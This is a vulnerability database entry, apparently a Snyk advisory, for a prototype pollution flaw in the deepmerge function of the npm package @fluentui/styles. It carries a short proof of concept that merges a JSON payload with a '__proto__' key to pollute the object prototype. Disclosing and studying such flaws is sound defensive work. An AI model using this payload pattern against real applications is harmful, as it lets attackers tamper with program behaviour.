- id: snykio:npm:@fluentui/styles:570808
  title: Prototype Pollution
  description: "[@fluentui/styles][1] is a set of styling utilities for CSS-in-JS.\n\nAffected
    versions of this package are vulnerable to Prototype Pollution.\nThe `deepmerge`
    function available within the styles package of FluentUI\nallows one object to
    merge with another recursively. Given a value such\nas `__proto__`, this value
    is merged without any prior validation.\n`__proto__` will modify the properties
    of all existing properties and\nnew properties resulting in pollution of an object\\'s
    prototype.\n\n### PoC   {#poc}\n\n    var styles = require(\"@fluentui/styles\");\n
    \   var malicious_payload = '{\"__proto__\":{\"vulnerable\":\"Polluted\"}}';\n
    \   var source2 = {\n        k3: { }  \n      };\n    var x = styles.deepmerge(source2,
    JSON.parse(malicious_payload))\n    console.log({}.vulnerable)\n\n\n\n[1]: https://www.npmjs.com/package/@fluentui/styles\n"
  affected_package: "@fluentui/styles"
  vulnerable_versions:
